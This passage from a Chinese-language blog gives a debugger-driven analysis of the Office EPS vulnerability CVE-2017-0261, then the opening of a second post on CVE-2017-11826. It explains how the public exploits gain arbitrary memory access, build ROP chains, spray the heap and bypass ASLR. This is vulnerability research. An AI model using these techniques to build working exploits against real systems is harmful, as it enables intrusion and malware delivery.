<p>第一次分析EPS类漏洞，对于PostScript格式十分陌生，通过查阅<a href="https://www.adobe.com/content/dam/acom/en/devnet/actionscript/articles/PLRM.pdf">PostScript LANGUAGE REFERENCE</a>了解PostScript格式。调试EXP来自kcufld师傅的<a href="https://github.com/kcufId/eps-CVE-2017-0261">eps-CVE-2017-0261</a>，EXP在Office 2007可以正常运行，但在Office 2010以上版本需要配合提权漏洞逃逸沙箱后完成利用。<!--more--></p>

<h2 id="调试环境">调试环境</h2>

<p>调试是直接使用kcufld师傅的eps加载器进行调试，EPSIMP32.FLT版本信息如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>OS:			Win7 x64 SP1
Office:		    	Ofiice 2007 x86
Image name: 		EPSIMP32.FLT
ImageSize:        	0x0006E000
File version:     	2006.1200.4518.1014
Product version:  	2006.1200.4518.0
</code></pre></div></div>

<h1 id="漏洞分析">漏洞分析</h1>

<h2 id="postscript格式简介">PostScript格式简介</h2>

<p>先介绍下PostScript基本的数据结构：</p>

<table>
  <thead>
    <tr>
      <th>SIMPLE OBJECTS</th>
      <th>COMPOSITE OBJECTS</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>boolean</td>
      <td>array</td>
    </tr>
    <tr>
      <td>fontID</td>
      <td>dictionary</td>
    </tr>
    <tr>
      <td>integer</td>
      <td>file</td>
    </tr>
    <tr>
      <td>mark</td>
      <td>gstate (LanguageLevel 2)</td>
    </tr>
    <tr>
      <td>name</td>
      <td>packedarray (LanguageLevel 2)</td>
    </tr>
    <tr>
      <td>null</td>
      <td>save</td>
    </tr>
    <tr>
      <td>operator</td>
      <td>string</td>
    </tr>
    <tr>
      <td>real</td>
      <td> </td>
    </tr>
  </tbody>
</table>

<p>左侧为简单对象，右侧为复合对象。简单对象都是原子实体，类型、属性和值不可逆转地结合在一起，不能改变。但复合对象的值与对象本身是分开的，对象本身存储于操作栈中，具体的结构如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// PostScript Object
struct PostScript object
{
    dword    type;		//对象类型		
    dword    attr;		
    dword    value1;	//指向对象所属变量名称
    dword    value2;	//若为简单对象，直接指向值；若为复合对象，指向存储的值的结构
}ps_obj;
</code></pre></div></div>

<p>其中部分type的值与类型的映射如下：</p>

<table>
  <thead>
    <tr>
      <th>type值</th>
      <th>数据类型</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>0x0</td>
      <td>nulltype</td>
    </tr>
    <tr>
      <td>0x3</td>
      <td>integertype</td>
    </tr>
    <tr>
      <td>0x5</td>
      <td>realtype</td>
    </tr>
    <tr>
      <td>0x8</td>
      <td>booleantype</td>
    </tr>
    <tr>
      <td>0x10</td>
      <td>operatortype</td>
    </tr>
    <tr>
      <td>0x20</td>
      <td>marktype</td>
    </tr>
    <tr>
      <td>0x40</td>
      <td>savetype</td>
    </tr>
    <tr>
      <td>0x300</td>
      <td>nametype</td>
    </tr>
    <tr>
      <td>0x500</td>
      <td>stringtype</td>
    </tr>
    <tr>
      <td>0x900</td>
      <td>filetype</td>
    </tr>
    <tr>
      <td>0x30000</td>
      <td>arraytype</td>
    </tr>
    <tr>
      <td>0x70000</td>
      <td>packedarraytype</td>
    </tr>
    <tr>
      <td>0x0B0000</td>
      <td>packedarraytype</td>
    </tr>
    <tr>
      <td>0x110000</td>
      <td>dicttype</td>
    </tr>
    <tr>
      <td>0x210000</td>
      <td>gstatetype</td>
    </tr>
  </tbody>
</table>

<p>接着介绍下漏洞中使用到的比较关键的操作符的意义：</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">操作符</th>
      <th style="text-align: left">示例</th>
      <th style="text-align: left">解析</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">forall</td>
      <td style="text-align: left">array  proc  forall</td>
      <td style="text-align: left">枚举第一个操作数的元素，为每个元素执行过程 proc。如果第一个操作数是数组、压缩数组或字符串对象，则 forall 将一个元素压入操作数堆栈，并对对象中的每个元素执行 proc，从索引为 0 的元素开始并依次执行。</td>
    </tr>
    <tr>
      <td style="text-align: left">dup</td>
      <td style="text-align: left">any  dup —&gt; any  any</td>
      <td style="text-align: left">复制操作数堆栈上的顶部元素。 dup 只复制对象；复合对象的值不是复制而是共享的。</td>
    </tr>
    <tr>
      <td style="text-align: left">putinterval</td>
      <td style="text-align: left">array1  index  array2  putinterval</td>
      <td style="text-align: left">用第三个操作数的全部内容替换第一个操作数的元素的子序列。被替换的子序列从第一个操作数的 index 开始；它的长度与第三个操作数的长度相同。</td>
    </tr>
    <tr>
      <td style="text-align: left">put/get</td>
      <td style="text-align: left">array  index  any  put/get</td>
      <td style="text-align: left">替换/获取第一个操作数的一个元素的值。如果第一个操作数是一个数组或一个字符串，put/get将第二个操作数视为一个索引，并将第三个操作数存储在索引所确定的位置，从0开始计算。</td>
    </tr>
    <tr>
      <td style="text-align: left">save</td>
      <td style="text-align: left">/save save</td>
      <td style="text-align: left">保存当前VM状态快照，一个快照只能使用一次。</td>
    </tr>
    <tr>
      <td style="text-align: left">restore</td>
      <td style="text-align: left">save restore</td>
      <td style="text-align: left">丢弃本地VM中自相应保存以来创建的所有对象，并回收它们占用的内存；将本地VM中所有复合对象的值（字符串除外）重置为保存时的状态；关闭自相应保存以来打开的文件，只要这些文件在local VM 分配模式有效时打开。</td>
    </tr>
  </tbody>
</table>

<p>了解了上述背景后，开始分析漏洞。</p>

<h2 id="漏洞成因">漏洞成因</h2>

<p>通过使用forall操作符获取创建的字符串对象，并在第一次循环时使用restore操作符释放字符串对象，随后创建新的字符串对象使得原本存储旧字符串对象的结构被新复合对象代替。若故意构造大小为0x27的字符串对象，则字符串被释放后会多出0x28的内存空间，此时立即创建新的字符串对象，则该内存会用来存储指向新字符串的string结构。随后通过改变forall的函数，获取指向新字符串的结构。</p>

<p>漏洞文件中一共触发了三次漏洞，第一次是获取了被释放的string的字符用于判断系统是32位还是64位。第二次触发故意构造大小为0x27的string对象，用于获取指向恶意string的结构。第三次则利用第二次构造的特殊string结构创造了一个起始地址为0x00000000，大小为0x7fffffff的字符串，构造了能够读写任意地址内存的读写原语。接着利用读写原语搜索内存中函数地址构造ROP链。最终创建了一个文件对象，在调用closefile操作符时跳转执行ROP完成漏洞利用。</p>

<p>查看poc.eps文件，第一次调用forall如图所示：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210903105452944.png" alt="image-20210903105452944" /></p>

<p>在ida中定位到forall操作符的代码：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210902173157063.png" alt="image-20210902173157063" /></p>

<p>使用windbg找到对应偏移后下断：<code class="language-plaintext highlighter-rouge">sxe ld EPSIMP32;g;bp EPSIMP32+2b928;g;</code></p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210831150138806.png" alt="image-20210831150138806" /></p>

<p>运行到图中所示位置时查看edi的值，指向了操作栈，查看后发现有两个对象在栈中，第一个为string l63，第二个为array l61</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210910180510699.png" alt="image-20210910180510699" /></p>

<p>继续分析，会获取l63和l61对象到栈中，并确认l63的类型为string后，跳转到获取string类型元素部分</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210831161042602.png" alt="image-20210831161042602" /></p>

<p>获取值的过程会因为type的不同而有所变化，具体如图所示：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210901172253284.png" alt="image-20210901172253284" /></p>

<p>通过调试可以更加直观的看到通过value2获取string的方式：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210831171553055.png" alt="image-20210831171553055" /></p>

<p>接着循环获取string中的每一个元素并执行函数：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210831192324185.png" alt="image-20210831192324185" /></p>

<p>此时传入deferred_exec的参数为eax，查看传入参数：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; bp EPSIMP32+2ba06          //call    deferred_exec
0:000&gt; g
Breakpoint 1 hit
eax=0018fd78 ebx=00000000 ecx=00291280 edx=00000001 esi=00425770 edi=00000000
eip=718fba06 esp=0018fd54 ebp=0018fdbc iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
EPSIMP32!RegisterPercentCallback+0x4604:
718fba06 e8d8abffff      call    deferred_exec (718f65e3)
0:000&gt; dd eax L4        //查看传入的参数为数组
0018fd78  00030000 00000000 0049ea98 0048f40c
0:000&gt; dd poi(poi(poi(poi(poi( 0018fd78 +c))+24))+28)   //查看数组中存储的内容
0049e2c0  00000500 00000100 00495408 0048ee98			//数组中存放着字符串对象
0049e2d0  12d85688 8000f194 00000020 00000100
0049e2e0  0049dc40 0048f198 12d8568f 80000000
0049e2f0  00490023 000007c8 00000300 00000100
0049e300  12d856b2 8000f19c 00000026 00000100
0049e310  0049dc60 0048f1a0 12d856b1 80000100
0049e320  00420029 0048f1a4 00000003 00000000
0049e330  12d856b4 80000080 0000002c 00000100
0:000&gt; db poi(poi(poi(poi(poi( 0049e2c0 +c))+24))+20) L10   //查看字符串的内容为l56 cvx exec
00495940  20 6c 35 36 20 63 76 78-20 65 78 65 63 20 00 00   l56 cvx exec ..
0:000&gt; g        //第二次执行deferred_exec
(5c8.144): C++ EH exception - code e06d7363 (first chance)
(5c8.144): C++ EH exception - code e06d7363 (first chance)
Breakpoint 1 hit
eax=0018fd78 ebx=00000000 ecx=00291280 edx=00000003 esi=00425770 edi=00000001
eip=718fba06 esp=0018fd54 ebp=0018fdbc iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
EPSIMP32!RegisterPercentCallback+0x4604:
718fba06 e8d8abffff      call    EPSIMP32+0x265e3 (718f65e3)
0:000&gt; dd poi(poi(poi(poi(poi( 0018fd78 +c))+24))+28)   //查看数组的内容
0049e2c0  00000500 00000100 00495438 0048eeac			//数组中存放着字符串对象
0049e2d0  12d85688 8000f194 00000020 00000100
0049e2e0  0049dc40 0048f198 12d8568f 80000000
0049e2f0  00490023 000007c8 00000300 00000100
0049e300  12d856b2 8000f19c 00000026 00000100
0049e310  0049dc60 0048f1a0 12d856b1 80000100
0049e320  00420029 0048f1a4 00000003 00000000
0049e330  12d856b4 80000080 0000002c 00000100
0:000&gt; db poi(poi(poi(poi(poi( 0049e2c0 +c))+24))+20) L10   //查看字符串的内容为l53 cvx exec
00495958  20 6c 35 33 20 63 76 78-20 65 78 65 63 20 00 00   l53 cvx exec ..
</code></pre></div></div>

<p>从调试的结果可以得知，该函数执行的正是forall。在第一次执行时，l61中待执行的命令是<code class="language-plaintext highlighter-rouge">l56 cvx exec</code>，在第二次执行时，l61中的内容已经被换成了<code class="language-plaintext highlighter-rouge">l53 cvx exec</code>与调试结果相符。</p>

<p>接着深入函数分析，发现函数内部嵌套了deferred_exec：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210901193647205.png" alt="image-20210901193647205" /></p>

<p>于是重新调试，下断在此，分析参数：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210901201303745.png" alt="image-20210901201303745" /></p>

<p>虽然type为0x10的操作符对象存储在Systemdict中无法查看，但是通过其他字符和数字还是能够确定该语句就是l50。当执行该语句后，原本l63指向的string结构将被替换成存放l52内容的string结构：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210901211439785.png" alt="image-20210901211439785" /></p>

<p>可以看到此时原本存放l63的string结构已经变成了l52。</p>

<p>在get函数下断，跳转到forall下的<code class="language-plaintext highlighter-rouge">/l64 l57 56 get def</code>语句查看l57的值：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210903144034585.png" alt="image-20210903144034585" /></p>

<p>可以证实l57中存放的就是从l63中获取到的字符，该forall的作用就是泄露被释放的string结构指向的字符串。</p>

<p>接着获取l57中的值，并进行一些处理，通过ifelse判断系统位数，若l77等于l52的长度+1，那么l99的值为1代表系统为64位，否则l99为0，代表系统为32位：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210903164816672.png" alt="image-20210903164816672" /></p>

<p>可以看到在32位的调试环境下，l77的值为0，因此会将5个0压入操作栈中，并赋值给l95到l99：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210903165138520.png" alt="image-20210903165138520" /></p>

<p>至此，漏洞原理部分分析完毕，接下来分析漏洞利用部分。</p>

<h1 id="漏洞利用">漏洞利用</h1>

<p>第二次执行forall代码如下：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210903171728048.png" alt="image-20210903171728048" /></p>

<p>和第一次执行十分类似，因此就不深入分析。查看执行完forall后stringl63的变化：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210904155018524.png" alt="image-20210904155018524" /></p>

<p>查看l63中的值，发现是一个string结构，于是查看字符串，内容正是l102中存储的l36的字符串</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210904155250267.png" alt="image-20210904155250267" /></p>

<p>接着通过<code class="language-plaintext highlighter-rouge">l90 0 l92 putinterval</code>将l63中指向的第一个4字节的内容改为0x02b14ad4，该值指向l36中四字节之后的内容</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210904161420028.png" alt="image-20210904161420028" /></p>

<p>经过多次修改，字符串修改为如下状态，修改的值会在第三次漏洞触发时使用到：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210907120914829.png" alt="image-20210907120914829" /></p>

<p>接着查看l137获取的是l63中0x4处的值，l138获取的是l63中0x20处的值，l103的值为1</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210904170623340.png" alt="image-20210904170623340" /></p>

<p>第二次漏洞触发部分分析完毕，接下分析第三次漏洞触发构造读写原语的部分。</p>

<h2 id="构造读写原语">构造读写原语</h2>

<p>l142中存储的是将l138放入到l193的0x24位置的后的字符串：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210904185419955.png" alt="image-20210904185419955" /></p>

<p>接着使用forall操作符遍历l63数组，当遍历到第54个元素时，恢复快照。此时array l63被释放，接着复制 l142字符串，使得array l63对象被l142字符串对象覆盖：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906105724780.png" alt="image-20210906105724780" /></p>

<p>此时查看被覆盖后的l63中最后一次会被获取的值：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906111515943.png" alt="image-20210906111515943" /></p>

<p>说明最后一次会获取一个array对象，继续深入查看该对象发现存储了一个字符串，该字符串起始地址为0x00000000，大小为0x7fffffff：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906112556232.png" alt="image-20210906112556232" /></p>

<p>通过该字符串，可读写内存中0x00000000-0x7fffffff的任意地址，实现了读写原语的构造，最终将字符串对象存储在l201中。</p>

<h2 id="构建rop链">构建ROP链</h2>

<p>通过字符串l201获取EPSIMP32的基地址为：0x74750000，并存入l314中：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906151059868.png" alt="image-20210906151059868" /></p>

<p>接着通过EPSIMP32的导入表获取kernel32.dll的基地址并存放于l315中：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906162228059.png" alt="image-20210906162228059" /></p>

<p>随后开始利用读写原语搜索内存中的gadget用于构造ROP链：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906164333935.png" alt="image-20210906164333935" /></p>

<p>将构造好的ROP链放入伪造的文件对象中，并将对象放置在l159的2号元素中，将恶意pe文件和shellcode组成的字符串放置在l159的3号元素中：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906200817931.png" alt="image-20210906200817931" /></p>

<p>最终调用closefile操作符关闭伪造的文件对象，在关闭过程中会执行<code class="language-plaintext highlighter-rouge">call [eax+8]</code>使得跳转到构造好的ROP链中：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906201456526.png" alt="image-20210906201456526" /></p>

<p>至此，整个漏洞的原理和利用分析完毕，剩下的行为部分不再分析。</p>

<h1 id="总结">总结</h1>

<p>该样本漏洞利用的十分巧妙，通过UAF将原本正常的数组对象替换为指向构造好的能够读写任意内存的字符串对象。通过字符串对象实现了读写任意内存并构造ROP链的目的，并最终将构造好的ROP字符串对象修改为文件对象，利用cloasefile操作符跳转到ROP链中。</p>

<p>尽管微软已经关闭了Office对于EPS文件的支持，但该格式文件仍然能被Adobe Illustrator打开，如果深入研究该类型文件可能仍有出现漏洞的可能。</p>

<h1 id="参考链接">参考链接</h1>

<p>[1] <a href="https://www.adobe.com/content/dam/acom/en/devnet/actionscript/articles/PLRM.pdf">PostScript LANGUAGE REFERENCE</a></p>

<p>[2] <a href="https://github.com/kcufId/eps-CVE-2017-0261">eps-CVE-2017-0261</a></p>

<p>[3] <a href="https://bbs.pediy.com/thread-261442.htm">CVE-2017-0261及利用样本分析</a></p>

<p>[4] <a href="https://www.fireeye.com/blog/threat-research/2017/05/eps-processing-zero-days.html">EPS Processing Zero-Days Exploited by Multiple Threat Actors</a></p>]]></content><author><name>Joey</name></author><category term="漏洞分析" /><summary type="html"><![CDATA[前言 第一次分析EPS类漏洞，对于PostScript格式十分陌生，通过查阅PostScript LANGUAGE REFERENCE了解PostScript格式。调试EXP来自kcufld师傅的eps-CVE-2017-0261，EXP在Office 2007可以正常运行，但在Office 2010以上版本需要配合提权漏洞逃逸沙箱后完成利用。]]></summary></entry><entry><title type="html">CVE-2017-11826 漏洞分析及利用</title><link href="http://localhost:4000/2021-08-04/CVE-2017-11826" rel="alternate" type="text/html" title="CVE-2017-11826 漏洞分析及利用" /><published>2021-08-04T00:00:00+08:00</published><updated>2021-08-04T00:00:00+08:00</updated><id>http://localhost:4000/2021-08-04/CVE-2017-11826</id><content type="html" xml:base="http://localhost:4000/2021-08-04/CVE-2017-11826"><![CDATA[<h1 id="前言">前言</h1>

<p>最近开始分析Office漏洞，拿到CVE-2017-11826的样本后发现无法在Office2010上成功执行，打算分析并改造该EXP。参考了许多资料，结合自己的理解写了本文，供大家学习和参考。<!--more--></p>

<h1 id="漏洞分析">漏洞分析</h1>

<h2 id="分析环境">分析环境</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>OS:			Win7 x64 SP1
Office:		    	Ofiice 2010 x86
Image name: 		wwlib.dll
Timestamp:      	Sat Mar 27 23:37:07 2010 (4BAE2623)
CheckSum:       	0127F568
ImageSize:      	0127A000
File version:   	14.0.4762.1000
Product version:	14.0.4762.0
</code></pre></div></div>

<h2 id="静态分析">静态分析</h2>

<p>在rtf文档中搜索object，发现嵌入了3个ole对象：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210727171412503.png" alt="image-20210727171412503" /></p>

<p>第一个对象的CLSID为<code class="language-plaintext highlighter-rouge">D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731</code>，在注册表搜索后发现该对象位于<code class="language-plaintext highlighter-rouge">C:\Windows\SysWOW64\msvbvm60.dll</code>，而该dll是没有ASLR的。</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210727175112215.png" alt="image-20210727175112215" /></p>

<p>通过ProcessExplorer发现word打开rtf文档后确实加载了msvbvm60.dll，且该dll无ASLR，说明该ole对象的作用是绕过ASLR。</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210727180558328.png" alt="image-20210727180558328" /></p>

<p>使用<code class="language-plaintext highlighter-rouge">rtfobj.py -s all</code>提取ole对象：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210727165632756.png" alt="image-20210727165632756" /></p>

<p>第一个对象经过上面的分析是用于绕过ASLR的，第二和第三个都是.doc文档，使用压缩软件直接打开第二个文档，文档结构如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>│  [Content_Types].xml
│  
├─docProps
│      app.xml
│      core.xml
│      
├─word
│  │  document.xml
│  │  fontTable.xml
│  │  settings.xml
│  │  styles.xml
│  │  webSettings.xml
│  │  
│  ├─activeX
│  │  │  activeX1.bin
│  │  │  activeX1.xml
│  │  │  activeX2.xml
│  │  │  	······
│  │  │  activeX40.xml
│  │  │  
│  │  └─_rels
│  │          activeX1.xml.rels
│  │          activeX2.xml.rels
│  │          		······
│  │          activeX40.xml.rels
│  │          
│  ├─media
│  │      image1.wmf
│  │      
│  ├─theme
│  │      theme1.xml
│  │      
│  └─_rels
│          document.xml.rels
│          
└─_rels
        .rels
</code></pre></div></div>

<p>可以看出使用了40个activeX.xml文件，文件内容如下：</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span>
<span class="nt">&lt;ax:ocx</span> <span class="na">ax:classid=</span><span class="s">"{00000000-0000-0000-0000-000000000001}"</span> <span class="na">ax:persistence=</span><span class="s">"persistStorage"</span> <span class="na">r:id=</span><span class="s">"rId1"</span> <span class="na">xmlns:ax=</span><span class="s">"http://schemas.microsoft.com/office/2006/activeX"</span> <span class="na">xmlns:r=</span><span class="s">"http://schemas.openxmlformats.org/officeDocument/2006/relationships"</span><span class="nt">/&gt;</span>
</code></pre></div></div>

<p>40个xml文件内容一致，加载了CLSID为{00000000-0000-0000-0000-000000000001}的对象，然而系统中并没有这个对象，所以并不会加载任何对象，这么做是为了提高堆喷的效率，具体原理可查看<a href="https://www.greyhathacker.net/?p=911">SPRAYING THE HEAP IN SECONDS USING ACTIVEX CONTROLS IN MICROSOFT OFFICE</a>一文。</p>

<p>而40个activeX.xml.rels的内容也完全一致：</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span>
<span class="nt">&lt;Relationships</span> <span class="na">xmlns=</span><span class="s">"http://schemas.openxmlformats.org/package/2006/relationships"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;Relationship</span> <span class="na">Id=</span><span class="s">"rId1"</span> <span class="na">Type=</span><span class="s">"http://schemas.microsoft.com/office/2006/relationships/activeXControlBinary"</span> <span class="na">Target=</span><span class="s">"activeX1.bin"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/Relationships&gt;</span>
</code></pre></div></div>

<p>都指向了activeX1.bin文件，因此会将activeX1.bin在内存中加载40次，以此达到堆喷的目的。</p>

<p>activeX1.bin文件结构如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>activeX1.bin
│ -文件头 
│ -数据
│    │---CB 40 94 72 EC 83 88 08 CB 40 94 72 EC 83 88 08
│    │						······
│    │---CB 40 94 72 EC 83 88 08 CB 40 94 72 EC 83 88 08
|    |
│    │---shellcode ······
|    |
│    │---2B 0E 98 72 2B 0E 98 72 2B 0E 98 72 2B 0E 98 72
│    │						······
│    │---2B 0E 98 72 2B 0E 98 72 2B 0E 98 72 2B 0E 98 72
│    │						······
│    │---CB 40 94 72 EC 83 88 08 CB 40 94 72 EC 83 88 08
│    │						······

</code></pre></div></div>

<p>看结构似乎是滑板指令加shellcode，待调试验证。</p>

<p>第三个文档结构如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>│  [Content_Types].xml
│  
├─docProps
│      app.xml
│      core.xml
│      
├─word
│  │  document.xml
│  │  endnotes.xml
│  │  fontTable.xml
│  │  footnotes.xml
│  │  settings.xml
│  │  styles.xml
│  │  webSettings.xml
│  │  
│  ├─theme
│  │      theme1.xml
│  │      
│  └─_rels
│          document.xml.rels
│          
└─_rels
        .rels
</code></pre></div></div>

<p>document.xml的内容如下：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804144955166.png" alt="image-20210804144955166" /></p>

<p>观测到&lt;w:font 标签内有异常字符，且标签未正常闭合，预测漏洞触发于该处。</p>

<p>通过静态分析了解到RTF文档通过内嵌3个ole对象来实现ASLR绕过、堆喷射和漏洞触发，ASLR绕过是通过加载CLSID为<code class="language-plaintext highlighter-rouge">D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731</code>的COM对象，将<code class="language-plaintext highlighter-rouge">msvbvm60.dll</code>加载到内存中。堆喷射利用40个activeX.xml.rels指向唯一的activeX1.bin文件，将activeX1.bin文件中的数据部分，即偏移为0x800后的内容加载到内存中实现堆喷射。而漏洞触发部分则利用document.xml中的异常字符和标签触发漏洞。</p>

<h3 id="动态调试">动态调试</h3>

<p>使用windbg附加word，打开漏洞文件：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210727162527153.png" alt="image-20210727162527153" /></p>

<p>可以看到异常因为ecx+4指向的内存无法访问导致错误。查看反汇编得知ecx的值来源于eax，此时eax的值为<code class="language-plaintext highlighter-rouge">088888ec</code>。再次打开漏洞文件发现ecx的值改变，但是eax的值仍为<code class="language-plaintext highlighter-rouge">088888ec</code>，说明eax的值为故意构造。</p>

<p>于是打算下断在函数<code class="language-plaintext highlighter-rouge">wwlib!DllGetClassObject+0x42d4 (71ed98b0)</code>查看eax是如何生成的。查看wwlib的基地址，算出函数的偏移为<code class="language-plaintext highlighter-rouge">wwlib+004da16b</code>。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; lm m wwlib
start    end        module name
71ed0000 7314a000   wwlib      (export symbols)       C:\PROGRA~2\MICROS~1\Office14\wwlib.dll
0:000&gt; ? 723aa16b-71ed0000
Evaluate expression: 5087595 = 004da16b
</code></pre></div></div>

<p>重新打开漏洞文档，<code class="language-plaintext highlighter-rouge">bp wwlib+004da16b</code>下断：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802112402518.png" alt="image-20210802112402518" /></p>

<p>步过两次后执行到如图所示位置时，查看eax所在的内存：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802112612050.png" alt="image-20210802112612050" /></p>

<p>发现和在文档3中的字符串一致，接着查看eax+44，对应的正是异常触发时eax的值<code class="language-plaintext highlighter-rouge">088888ec</code>。</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802112936829.png" alt="image-20210802112936829" /></p>

<p>但在xml文件中，字符串中的异常字符的十六进制为<code class="language-plaintext highlighter-rouge">e8a3ace0a288</code>：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802140720647.png" alt="image-20210802140720647" /></p>

<p>在文件中显示的格式是Ascii，然而在内存中显示的是Unicode，于是将文件中的字符以utf-8格式转换为十六进制正是eax的值<code class="language-plaintext highlighter-rouge">088888ec</code>：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802142105409.png" alt="image-20210802142105409" /></p>

<p>说明通过修改该字符串可以控制eax的值，进而控制eip。</p>

<p>在ida中找到奔溃函数为sub_31A55CE6，发现变量v3是宽字节字符串，位于arg2+0x18，变量v4是一个长度，位于arg2+0x1c</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802153650508.png" alt="image-20210802153650508" /></p>

<p>在windbg设置崩溃函数起始点打印v3为字符串，长度为v4：<code class="language-plaintext highlighter-rouge">bp wwlib+385ce6 "du poi(poi(esp+8)+18) Lpoi(poi(esp+8)+1c); g;"</code></p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802161250939.png" alt="image-20210802161250939" /></p>

<p>可以看到v3就是xml文件中的标签，在解析到idmp标签后程序崩溃，然而并没有看到font标签，于是寻找到崩溃函数的父函数sub_3170FA5A</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802163044663.png" alt="image-20210802163044663" /></p>

<p>崩溃函数arg2的值为edi，而edi的值为父函数的arg2：</p>

